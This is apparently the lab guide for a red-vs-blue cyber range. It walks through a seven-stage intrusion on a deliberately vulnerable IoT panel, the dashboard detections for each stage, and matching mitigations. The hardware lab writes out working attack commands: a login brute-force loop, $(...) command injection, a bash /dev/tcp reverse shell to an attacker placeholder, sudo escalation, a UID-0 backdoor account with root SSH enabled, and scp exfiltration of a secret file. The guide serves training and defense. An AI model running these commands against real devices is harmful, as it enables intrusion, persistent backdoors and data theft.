# Sentinel-E — Cyber Range Lab Guide

A hands-on red-vs-blue worksheet. You will stand up the platform, drive a complete seven-stage intrusion against a vulnerable IoT device, watch the blue-team detection stack catch every stage live, and then apply mitigations to demonstrate the same attack failing.

Two labs are provided:

- **Lab A — Hardware-free demo.** Everything on one machine, no external hosts. Best first run.
- **Lab B — Full hardware cyber range.** A real target, a real attacker box, real network telemetry. The full training experience.

Both drive the **same detection engine** and the **same dashboard**.

---

## Prerequisites

| Requirement | Lab A (demo) | Lab B (hardware) |
|-------------|:---:|:---:|
| Python 3.9+ | ✅ | ✅ (SOC) |
| `aiohttp` (auto-installed into a venv) | ✅ | ✅ |
| A modern browser | ✅ | ✅ |
| A target device (e.g. Raspberry Pi/Linux host) | — | ✅ |
| An attacker host (e.g. Kali) with `nmap`, `curl`, `nc` | — | ✅ |
| Network reachability SOC ⇄ target ⇄ attacker | — | ✅ |

The SOC dashboard listens on **:8770**; the vulnerable panel on **:8080**.

---

## Lab A — Hardware-free demo

### A.1 Launch

```bash
git clone https://github.com/sh4mbhavi/Sentinel-E.git
cd Sentinel-E
./demo.sh                # or: python3 demo.py
```

Open **http://localhost:8770/**. Roughly seven seconds after the page loads, a simulated adversary begins the intrusion.

### A.2 What you are watching

A local telemetry generator emits raw observations in the **exact schema a compromised device produces** — port-scan SYNs, failed logins, an injected command, an outbound C2 connection, a sudo escalation, a new root account, a secret read, an egress channel. The **unmodified detection engine** evaluates that stream and raises alerts only when its real thresholds and correlation windows are crossed. Nothing is pre-canned.

### A.3 Stage-by-stage — what lights up

Watch these fire in sequence (~3 seconds apart). For each stage, the **Cyber Kill Chain** node illuminates, the matching **ATT&CK matrix** cell highlights, the **alert feed** streams a new row, and the **counters/charts** update.

| # | Stage | On the dashboard you'll see |
|---|-------|-----------------------------|
| 1 | Reconnaissance | `medium` alert **T1046**, source = the adversary IP; kill-chain node 1 lights up |
| 2 | Credential brute-force | `high` alert **T1110**, "N failed logins … in Ns" |
| 3 | Command injection | `high` alert **T1059**, the injected `$(...)` payload shown in the detail drawer |
| 4 | Reverse shell / C2 | `critical` alert **T1571**, outbound to a non-standard port |
| 5 | Privilege escalation | `critical` alert **T1548**, service account → uid 0 |
| 6 | Persistence | `critical` alert **T1136**, new UID-0 account + sshd change |
| 7 | Exfiltration | `critical` alert **T1041/T1048**, sensitive-file read correlated with egress |

By the end, the header reads **7 / 7 stages triggered** and the ATT&CK matrix is fully lit. Click any alert row to open the detail drawer (MITRE mapping, phase, source, timestamps, raw context).

> **Tip:** to loop the attack continuously (e.g. for a screen recording), set `SENTINEL_DEMO_LOOP=1` before launching.

---

## Lab B — Full hardware cyber range

### B.1 Topology & roles

```
   ATTACKER  ───attack───▶  TARGET (IoT device)  ───live telemetry───▶  SENTINEL-E SOC
   <ATTACKER_IP>            <TARGET_IP> :8080                            <SOC_IP> :8770
   nmap / hydra / curl      vulnerable panel + sensor                   ingestion → engine → dashboard
```

Set the three addresses and the target's SSH details in **`config/sentinel.conf.json`** (`network` block) before you begin.

### B.2 Provision the target

From the SOC, deploy the vulnerable panel and the multi-source telemetry sensor to the target:

```bash
./scripts/deploy_pi.sh
```

This installs the panel (`:8080`, with structured logging) and stages the sensor, which streams three real telemetry sources — `journalctl` (auth/sudo/sshd), `tcpdump` (network), and `inotify` (file integrity) — as a single JSON event stream.

### B.3 Start the SOC

```bash
./scripts/start_soc.sh
```

Ingestion opens a persistent live stream from the target's sensor, the engine begins evaluating events, and the dashboard comes up on **http://<SOC_IP>:8770/**. Confirm the header shows **sensor: online** and **0 / 7** stages. Open the dashboard now so you can watch detections land in real time.

### B.4 The attack — stage by stage

Run these from the **attacker host**. A ready-made driver is provided (`attack/kali_attack.sh`); the commands below are the essence of each stage. For each, the table notes **what to run**, **what fires**, and **why the engine catches it**.

Log in to the panel and keep a session (needed for the injection stages):

```bash
# authenticate once; save the session cookie
curl -s -c /tmp/jar -d 'user=admin&password=camera1' http://<TARGET_IP>:8080/login >/dev/null
```

#### Stage 1 — Reconnaissance · T1046

```bash
nmap -Pn -T4 -p 1-1000 <TARGET_IP>
```
- **Detection:** the sensor captures inbound SYNs; the engine counts *distinct destination ports per source* over a sliding window and fires once the threshold is crossed.
- **Observe:** a `medium` **Reconnaissance** alert, source = `<ATTACKER_IP>`; kill-chain node 1 lights up.

#### Stage 2 — Credential brute-force · T1110

```bash
for pw in admin 12345 password root camera letmein default; do
  curl -s -o /dev/null -d "user=admin&password=$pw" http://<TARGET_IP>:8080/login
done
```
- **Detection:** the panel logs every failed login; the engine counts failures per source over a sliding window.
- **Observe:** a `high` **Credential Brute-Force** alert with the attempt count.

#### Stage 3 — Command injection · T1059

```bash
curl -s -o /dev/null -b /tmp/jar --data-urlencode 'host=8.8.8.8$(id)' http://<TARGET_IP>:8080/ping
```
- **Detection:** the panel's naive character blacklist is bypassed by `$(...)` command substitution; the engine's regex flags shell metacharacters in the `host` field.
- **Observe:** a `high` **Command Injection** alert; the drawer shows the exact payload.

#### Stage 4 — Reverse shell / C2 · T1571

```bash
# listener on the attacker
nc -lvnp 4444 &
# drive the target to dial back (through the injection point)
curl -s -o /dev/null -b /tmp/jar \
  --data-urlencode 'host=8.8.8.8$(bash -c "exec 3<>/dev/tcp/<ATTACKER_IP>/4444")' \
  http://<TARGET_IP>:8080/ping
```
- **Detection:** the sensor sees an outbound SYN from the target to a non-standard port.
- **Observe:** a `critical` **Reverse Shell / C2** alert (dst port 4444).

#### Stage 5 — Privilege escalation · T1548

```bash
curl -s -o /dev/null -b /tmp/jar --data-urlencode 'host=8.8.8.8$(sudo -n id)' http://<TARGET_IP>:8080/ping
```
- **Detection:** the auth log records the web service account invoking `sudo` to reach uid 0; the engine matches a web/service user → root.
- **Observe:** a `critical` **Privilege Escalation** alert.

#### Stage 6 — Persistence · T1136

```bash
# create a UID-0 backdoor and enable root login (run from the target foothold)
sudo useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor
echo 'backdoor:hacked123' | sudo chpasswd
sudo sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
sudo systemctl reload ssh
```
- **Detection:** the file-integrity watch sees a new UID-0 line in `/etc/passwd` and a modification to `sshd_config`.
- **Observe:** a `critical` **Persistence** alert (new account `backdoor`).

#### Stage 7 — Exfiltration · T1041 / T1048

```bash
# from the attacker: pull the sensitive config off the device
scp backdoor@<TARGET_IP>:/root/camera_config.secret /tmp/loot     # password: hacked123
```
- **Detection:** reading the sensitive file emits a file-access event; the inbound SSH/scp session is an egress channel. The engine **correlates the read with the transfer** inside its correlation window and fires.
- **Observe:** a `critical` **Exfiltration** alert, source = target, peer = `<ATTACKER_IP>`.

At this point the kill chain reads **7 / 7** and the ATT&CK matrix is fully lit — the complete intrusion, detected live.

> **Note:** a UID-0 account can only password-login when `PermitRootLogin yes` is set — that is exactly why Stage 6 sets it. If the exfil login is refused, confirm that setting on the target.

---

## Reading the console (blue team)

- **KPI tiles** — running totals by severity, distinct techniques observed, kill-chain progress.
- **Alert Volume / Severity** — attack tempo and the critical-heavy signature of a full intrusion.
- **Cyber Kill Chain** — the attacker's progression, one node per stage.
- **ATT&CK Matrix** — techniques observed, highlighted by tactic column.
- **Detection Rules** — the live rule catalogue with per-rule hit counts.
- **Alerts table** — the SIEM view; click a row for the full detail drawer.
- **Telemetry Sources** — live health of each ingest channel (auth / network / file / app).

---

## Mitigations exercise — make the attack fail

The blue team's job isn't finished at detection. For each technique, apply the fix from **[docs/MITIGATIONS.md](docs/MITIGATIONS.md)**, then re-run that stage and confirm it no longer succeeds. Highlights:

| Stage | Apply | Expected result on re-run |
|-------|-------|---------------------------|
| 3 · Injection | Replace the blacklist with `subprocess.run(["ping","-c","2",host])` and validate `host` against an allowlist | The `$(...)` payload is treated as a literal string; no command runs |
| 5 · Privesc | Remove `NOPASSWD` sudo from the service account | The injected `sudo` fails; no escalation |
| 6 · Persistence | Set `PermitRootLogin no`, key-only auth, and make `/etc/passwd` immutable (`chattr +i`) | Backdoor login refused; account creation blocked/reverted |
| 4 · C2 & 7 · Exfil | Apply egress default-deny (allow only required destinations) | The reverse shell and the exfil transfer cannot leave the device |
| 2 · Brute-force | Rate-limit `/login` and add lockout (e.g. `fail2ban` on the panel log) | Attempts are throttled/banned before the threshold |

Re-running the chain after hardening demonstrates the full red-vs-blue loop: **detect, then prevent.**

---

## Reset & cleanup

- **Demo:** stop with `Ctrl+C`; the store is wiped on each `./demo.sh` launch.
- **Hardware:** remove the backdoor and revert the SSH hardening on the target:
  ```bash
  python3 attack/replay.py --cleanup
  ```
  Restart the SOC (`./scripts/start_soc.sh`) for a clean baseline.

You now have a repeatable, end-to-end red-vs-blue range: attack, detect, mitigate, verify.
